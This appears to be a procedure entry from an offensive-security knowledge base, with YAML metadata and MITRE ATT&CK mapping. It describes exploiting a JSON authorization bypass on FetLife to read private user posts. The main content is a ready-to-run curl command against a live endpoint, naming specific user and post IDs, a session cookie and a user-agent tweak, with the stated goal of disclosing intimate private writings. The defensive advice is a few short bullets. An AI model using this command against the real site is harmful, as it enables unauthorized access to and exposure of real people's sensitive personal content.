---
id: c16a9e62-65ca-42cc-abfe-8c885e9adcd5
name: Access-Private-FetLife-Posts-via-JSON
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.450Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Information Repositories]]'
tags:
  - authorization-bypass
  - json-api
  - information-disclosure
  - fetlife
  - posts
commands:
  - '[[commands/curl-fetlife-private-post-json]]'
platforms:
  - Web
tools:
  - '[[tools/curl]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---

# Access-Private-FetLife-Posts-via-JSON

## Summary

This procedure leverages the JSON authorization bypass in FetLife's post endpoints to retrieve private user writings and posts, enabling unauthorized disclosure of sensitive textual content using known post IDs.

## Description

FetLife's /users/{user-id}/posts/{post-id} API omits access verification for JSON outputs. Attackers can use a generic session to pull private posts, including personal writings, exposing intimate details on a social platform for kink and fetish communities.

## Requirements

1. FetLife session cookie (_fl_sessionid)
2. Target user and private post IDs
3. curl tool
4. Access to the web application

## Defense

Defensive measures and detection strategies:

- Ensure JSON handlers validate user permissions identically to HTML
- Implement anomaly detection for JSON post requests
- Restrict post visibility enforcement at the controller level

## Objectives

1. Obtain private post content via JSON
2. Disclose user-generated sensitive data
3. Validate multi-resource bypass

## Instructions

### Step 1: Request Private Post in JSON

**Context**: Target the post endpoint with auth bypass technique.

**Command** ([[commands/curl-fetlife-private-post-json]]):
```bash
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

> Use real session value for {your-session}. Expected: JSON with post body, date, and attachments, revealing private info.

### Step 2: Confirm Unauthorized Access

**Context**: Cross-check against HTML denial.

Request the same post without JSON header to verify privacy enforcement only in HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetlife-private-post-json]]

## Tools Used

- [[tools/curl]]

## Tags

- [[authorization-bypass]]
- [[information-disclosure]]
- [[posts]]
